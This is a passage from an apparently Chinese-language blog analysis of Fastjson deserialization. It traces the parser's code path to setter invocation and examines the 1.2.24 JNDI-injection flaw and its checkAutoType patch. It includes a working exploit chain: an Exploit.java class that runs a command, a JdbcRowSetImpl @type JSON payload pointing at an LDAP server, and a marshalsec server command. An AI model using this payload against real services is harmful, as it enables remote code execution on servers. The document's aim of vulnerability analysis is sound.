class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;create instance error&quot;</span>, var23);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">this</span>.setResolveStatus(<span class="number">2</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.context != <span class="literal">null</span> &amp;&amp; !(fieldName <span class="keyword">instanceof</span> Integer)) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.popContext();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (object.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    instance = TypeUtils.cast(object, clazz, <span class="built_in">this</span>.config);</span><br><span class="line">                    <span class="built_in">this</span>.parseObject(instance);</span><br><span class="line">                    thisObj = instance;</span><br><span class="line">                    <span class="keyword">return</span> thisObj;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="built_in">this</span>.config.getDeserializer(clazz); <span class="comment">// 获取反序列化解析器</span></span><br><span class="line">                thisObj = deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName); <span class="comment">// 进行反序列化</span></span><br><span class="line">                <span class="keyword">return</span> thisObj;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            object.put(JSON.DEFAULT_TYPE_KEY, ref);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>跟进<code>TypeUtils.loadClass()</code>函数，创建ClassLoader返回了对应类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TypeUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = (Class)mappings.get(className); <span class="comment">// 获取类名</span></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123; <span class="comment">// 去掉&#x27;[&#x27;</span></span><br><span class="line">                Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">                <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123; <span class="comment">// 去掉前面的&#x27;L&#x27;和后面&#x27;;&#x27;</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123; <span class="comment">// 检查是否已有指定的classLoader</span></span><br><span class="line">                        clazz = classLoader.loadClass(className);</span><br><span class="line">                        mappings.put(className, clazz);</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var6) &#123;</span><br><span class="line">                    var6.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader(); <span class="comment">// 从当前线程创建classLoader</span></span><br><span class="line">                    <span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">                        clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                        mappings.put(className, clazz);</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var5) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    clazz = Class.forName(className);</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下一步进入到<code>getDeserializer()</code>函数，获取对应的反序列化器，这里返回的是<code>JavaBeanDeserializer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> ObjectDeserializer <span class="title function_">getDeserializer</span><span class="params">(Type type)</span> &#123;</span><br><span class="line">        <span class="type">ObjectDeserializer</span> <span class="variable">derializer</span> <span class="operator">=</span> (ObjectDeserializer)<span class="built_in">this</span>.derializers.get(type);</span><br><span class="line">        <span class="keyword">if</span> (derializer != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> derializer;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getDeserializer((Class)type, type);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">            <span class="type">Type</span> <span class="variable">rawType</span> <span class="operator">=</span> ((ParameterizedType)type).getRawType();</span><br><span class="line">            <span class="keyword">return</span> rawType <span class="keyword">instanceof</span> Class ? <span class="built_in">this</span>.getDeserializer((Class)rawType, type) : <span class="built_in">this</span>.getDeserializer(rawType);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> JavaObjectDeserializer.instance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> ObjectDeserializer <span class="title function_">getDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.denyList.length; ++i) &#123; <span class="comment">// 在中间的某一步会检查类名是否处在黑名单中，在1.2.24版本之前，denyList为[&quot;java.lang.Thread&quot;]</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> <span class="built_in">this</span>.denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;parser deny : &quot;</span> + className);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>获取完对应的反序列化器后进可以进行反序列化了，跟进<code>deserialze()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBeanDeserializer</span> <span class="keyword">implements</span> <span class="title class_">ObjectDeserializer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.deserialze(parser, type, fieldName, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>上面一步会创建该类的实例<code>instance</code>然后传入到内部的<code>parseRest()</code>函数，进到更具体的<code>deserialze()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBeanDeserializer</span> <span class="keyword">implements</span> <span class="title class_">ObjectDeserializer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">parseRest</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName, Object instance, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.deserialze(parser, type, fieldName, instance, features);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这一步的<code>deserialze()</code>函数因为太多也不具体展示了，主要是处理其对象成员，然后调用其<code>set</code>函数来给实例进行赋值，主要代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBeanDeserializer</span> <span class="keyword">implements</span> <span class="title class_">ObjectDeserializer</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName, Object object, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (matchField) &#123; <span class="comment">// 是否匹配到对象成员</span></span><br><span class="line">            <span class="keyword">if</span> (!valueParsed) &#123;</span><br><span class="line">                fieldDeser.parseField(parser, object, type, fieldValues);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (object == <span class="literal">null</span>) &#123;</span><br><span class="line">                    fieldValues.put(fieldInfo.name, fieldValue);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldValue == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (fieldClass != Integer.TYPE &amp;&amp; fieldClass != Long.TYPE &amp;&amp; fieldClass != Float.TYPE &amp;&amp; fieldClass != Double.TYPE &amp;&amp; fieldClass != Boolean.TYPE) &#123;</span><br><span class="line">                        fieldDeser.setValue(object, fieldValue);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    fieldDeser.setValue(object, fieldValue); <span class="comment">// 调用setValue()函数进行赋值</span></span><br><span class="line">                &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>跟一下<code>setValue()</code>函数可以看到使用了<code>invoke()</code>调用了对应的<code>set</code>函数，发现<code>this.fieldInfo.method</code>其实在创建反序列化器的时候就已经被创建，所以我们移步回这个<code>this.config.getDeserializer(clazz)</code>函数的实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">FieldDeserializer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object object, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span> || !<span class="built_in">this</span>.fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="built_in">this</span>.fieldInfo.method; <span class="comment">// 获取对应的set函数</span></span><br><span class="line">                <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.fieldInfo.getOnly) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                            <span class="type">AtomicInteger</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicInteger)method.invoke(object);</span><br><span class="line">                            <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                                atomic.set(((AtomicInteger)value).get());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                            <span class="type">AtomicLong</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicLong)method.invoke(object);</span><br><span class="line">                            <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                                atomic.set(((AtomicLong)value).get());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                            <span class="type">AtomicBoolean</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicBoolean)method.invoke(object);</span><br><span class="line">                            <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                                atomic.set(((AtomicBoolean)value).get());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map)method.invoke(object);</span><br><span class="line">                            <span class="keyword">if</span> (map != <span class="literal">null</span>) &#123;</span><br><span class="line">                                map.putAll((Map)value);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> (Collection)method.invoke(object);</span><br><span class="line">                            <span class="keyword">if</span> (collection != <span class="literal">null</span>) &#123;</span><br><span class="line">                                collection.addAll((Collection)value);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        method.invoke(object, value); <span class="comment">// 使用invoke()调用该set函数</span></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>一直跟进到下面这行代码，我们需要创建一个<code>JavaBeanDeserializer</code>的反序列化器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ObjectDeserializer <span class="title function_">getDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> &#123;</span><br><span class="line">    	...</span><br><span class="line">		derializer = <span class="built_in">this</span>.createJavaBeanDeserializer(clazz, (Type)type);</span><br><span class="line">		...</span><br></pre></td></tr></table></figure>

<p>在<code>createJavaBeanDeserializer()</code>中对传入的类建立一个<code>beanInfo</code>，这个<code>beanInfo</code>包含了一个类的全部重要属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ObjectDeserializer <span class="title function_">createJavaBeanDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">		beanInfo = JavaBeanInfo.build(clazz, type, <span class="built_in">this</span>.propertyNamingStrategy);</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>跟进<code>JavaBeanInfo.build()</code>函数的具体实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBeanInfo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JavaBeanInfo <span class="title function_">build</span><span class="params">(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    	...</span><br><span class="line">            </span><br><span class="line">		Method[] methods = clazz.getMethods(); <span class="comment">// 获取该类的全部方法</span></span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// 比例类的所有方法，如果找到了以&quot;set&quot;开头的方法</span></span><br><span class="line">            <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> methodName.charAt(<span class="number">3</span>);</span><br><span class="line">            String propertyName;</span><br><span class="line">            <span class="keyword">if</span> (!Character.isUpperCase(c3) &amp;&amp; c3 &lt;= <span class="number">512</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">                    propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">                    propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (methodName.length() &lt; <span class="number">5</span> || !Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">                propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>); <span class="comment">// 截取&quot;set&quot;之后的字符串并让首字母转为小写，即获取其属性名</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> TypeUtils.getField(clazz, propertyName, declaredFields);</span><br><span class="line">            <span class="keyword">if</span> (field == <span class="literal">null</span> &amp;&amp; types[<span class="number">0</span>] == Boolean.TYPE) &#123; <span class="comment">// 如果该属性不在声明成员中且为bool类型时</span></span><br><span class="line">                isFieldName = <span class="string">&quot;is&quot;</span> + Character.toUpperCase(propertyName.charAt(<span class="number">0</span>)) + propertyName.substring(<span class="number">1</span>); <span class="comment">// 转化为对应的&quot;is&quot;方法</span></span><br><span class="line">                field = TypeUtils.getField(clazz, isFieldName, declaredFields); <span class="comment">// 检查其是否存在&quot;is&quot;方法</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">JSONField</span> <span class="variable">fieldAnnotation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">                fieldAnnotation = (JSONField)field.getAnnotation(JSONField.class);</span><br><span class="line">                <span class="keyword">if</span> (fieldAnnotation != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!fieldAnnotation.deserialize()) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ordinal = fieldAnnotation.ordinal();</span><br><span class="line">                    serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());</span><br><span class="line">                    parserFeatures = Feature.of(fieldAnnotation.parseFeatures());</span><br><span class="line">                    <span class="keyword">if</span> (fieldAnnotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                        propertyName = fieldAnnotation.name();</span><br><span class="line">                        add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)<span class="literal">null</span>)); <span class="comment">// 如果存在对应的&quot;set&quot;方法就会加入到域成员列表中</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (propertyNamingStrategy != <span class="literal">null</span>) &#123;</span><br><span class="line">                propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)<span class="literal">null</span>)); <span class="comment">// 最后把对应的属性名和&quot;set&quot;方法等相关信息加入到成员列表中</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>那么关于json字符串从反序列化开始后到对应属性的<code>set</code>方法调用的分析就到此为止</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-2-24漏洞"><a href="#1-2-24漏洞" class="headerlink" title="1.2.24漏洞"></a>1.2.24漏洞</h3><p><strong>Exploit.java</strong></p>
<blockquote>
<p>务必记得Exploit.java的编译环境要尽量与漏洞触发环境（客户端）相同</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">    	<span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// javac Explit.java</span></span><br><span class="line"><span class="comment">// python -m http.server 8888    </span></span><br></pre></td></tr></table></figure>

<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p><strong>服务器</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://localhost:<span class="number">8888</span>/#Exploit&quot; <span class="number">1389</span></span><br></pre></td></tr></table></figure>

<p><strong>分析</strong></p>
<p>反序列化调用<code>setAutoCommit()</code>函数进行赋值，期间会调用<code>connect()</code>函数</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105240210736d2a3107a8f4a9ac8a.png" alt="image-20210523021746723" style="zoom: 80%;" />

<p>跟进<code>connect()</code>函数，如果<code>dataSourceName</code>不为空就会调用<code>lookup()</code>函数造成jndi注入</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105240210be38ee1879569a57a263.png" alt="image-20210523021713896" style="zoom: 80%;" />

<p><strong>Patch</strong></p>
<p>在<code>parseObject()</code>中引入了<code>checkAutoType()</code>的黑白名单检查</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultJSONParser</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(Map object, Object fieldName)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">            typeName = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">                strValue = <span class="literal">null</span>;</span><br><span class="line">                Class clazz;</span><br><span class="line">                <span class="keyword">if</span> (object != <span class="literal">null</span> &amp;&amp; object.getClass().getName().equals(typeName)) &#123;</span><br><span class="line">                    clazz = object.getClass();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    clazz = <span class="built_in">this</span>.config.checkAutoType(typeName, (Class)<span class="literal">null</span>, lexer.getFeatures()); <span class="comment">// 检查黑名单</span></span><br><span class="line">                &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p><code>checkAutoType()</code>函数的详细代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">128</span>) &#123; <span class="comment">// 限制了小于128的长度</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">int</span> mask;</span><br><span class="line">            String accept;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(mask = <span class="number">0</span>; mask &lt; <span class="built_in">this</span>.acceptList.length; ++mask) &#123; <span class="comment">// 检查白名单</span></span><br><span class="line">                    accept = <span class="built_in">this</span>.acceptList[mask];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(mask = <span class="number">0</span>; mask &lt; <span class="built_in">this</span>.denyList.length; ++mask) &#123; <span class="comment">// 检查黑名单</span></span><br><span class="line">                    accept = <span class="built_in">this</span>.denyList[mask];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(accept) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                clazz = <span class="built_in">this</span>.deserializers.findClass(typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) 